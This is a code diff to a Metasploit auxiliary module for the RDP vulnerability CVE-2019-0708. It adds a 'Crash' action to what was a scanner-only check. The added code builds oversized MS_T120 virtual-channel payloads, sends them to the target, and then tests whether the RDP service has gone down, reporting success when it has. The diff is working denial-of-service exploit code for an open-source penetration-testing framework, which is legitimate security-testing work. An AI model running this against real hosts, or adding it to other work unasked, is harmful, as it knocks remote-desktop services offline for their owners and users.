@@ -15,13 +15,14 @@ class MetasploitModule < Msf::Auxiliary
         This module checks a range of hosts for the CVE-2019-0708 vulnerability
         by binding the MS_T120 channel outside of its normal slot and sending
         non-DoS packets which respond differently on patched and vulnerable hosts.
+        It can optionally trigger the DoS vulnerability.
       },
       'Author'         =>
         [
           'National Cyber Security Centre', # Discovery
           'JaGoTu',                         # Module
           'zerosum0x0',                     # Module
-          'Tom Sellers'                     # TLS support and documented packets
+          'Tom Sellers'                     # TLS support, packet documenentation, DoS implementation
         ],
       'References'     =>
         [
@@ -30,6 +31,11 @@ class MetasploitModule < Msf::Auxiliary
         ],
       'DisclosureDate' => '2019-05-14',
       'License'        => MSF_LICENSE,
+      "Actions" => [
+        ["Scan", "Description" => "Scan for exploitable targets"],
+        ["Crash", "Description" => "Trigger denial of service vulnerability"],
+      ],
+      "DefaultAction" => "Scan",
       'Notes'          =>
         {
           'Stability' => [ CRASH_SAFE ],
@@ -65,9 +71,18 @@ class MetasploitModule < Msf::Auxiliary
     status
   end
 
+  def rdp_reachable
+    connect
+    disconnect
+    return true
+  rescue Rex::ConnectionRefused
+    return false
+  rescue Rex::ConnectionTimeout
+    return false
+  end
+
   def check_host(_ip)
     # The check command will call this method instead of run_host
-
     status = Exploit::CheckCode::Unknown
 
     begin
@@ -116,17 +131,50 @@ class MetasploitModule < Msf::Auxiliary
     # The arch governs which of the packets triggers the desired response
     # which is an MCS Disconnect Provider Ultimatum or a timeout.
 
-    # 0x03 = CHANNEL_FLAG_FIRST | CHANNEL_FLAG_LAST
-    x86_payload = build_virtual_channel_pdu(0x03, ["00000000020000000000000000000000"].pack("H*"))
-    x64_payload = build_virtual_channel_pdu(0x03, ["0000000000000000020000000000000000000000000000000000000000000000"].pack("H*"))
+    # Disconnect Provider message of a valid size for each platform
+    # has proven to be safe to send as part of the vulnerability check.
+    x86_string = "00000000020000000000000000000000"
+    x64_string = "0000000000000000020000000000000000000000000000000000000000000000"
 
-    vprint_status("Sending patch check payloads")
+    if action.name == 'Crash'
+      vprint_status("Sending denial of service payloads")
+      # Length and chars are arbitrary but total length needs to be longer than
+      # 16 for x86 and 32 for x64. Making the payload too long seems to cause
+      # the DoS to fail. Note that sometimes the DoS seems to fail. Increasing
+      # the payload size and sending more of them doesn't seem to improve the
+      # reliability. It *seems* to happen more often on x64, I haven't seen it
+      # fail against x86. Repleated attempts will generally trigger the DoS.
+      x86_string += "FF" * 1
+      x64_string += "FF" * 2
+    else
+      vprint_status("Sending patch check payloads")
+    end
+
+    # 0x03 = CHANNEL_FLAG_FIRST | CHANNEL_FLAG_LAST
+    x86_payload = build_virtual_channel_pdu(0x03, [x86_string].pack("H*"))
+    x64_payload = build_virtual_channel_pdu(0x03, [x64_string].pack("H*"))
+
     6.times do
       # 0xed03 = Channel 1005
       x86_packet = rdp_build_pkt(x86_payload, "\x03\xed")
       rdp_send(x86_packet)
       x64_packet = rdp_build_pkt(x64_payload, "\x03\xed")
       rdp_send(x64_packet)
+
+      # A single pass should be sufficient to cause DoS
+      if action.name == 'Crash'
+        sleep(1)
+        disconnect
+
+        sleep(1)
+        if rdp_reachable
+          print_error("Target doesn't appear to have been crashed.")
+          return Exploit::CheckCode::Unknown
+        else
+          print_good("Target service appears to have been successfully crashed.")
+          return Exploit::CheckCode::Vulnerable
+        end
+      end
 
       # Quick check for the Ultimatum PDU
       begin
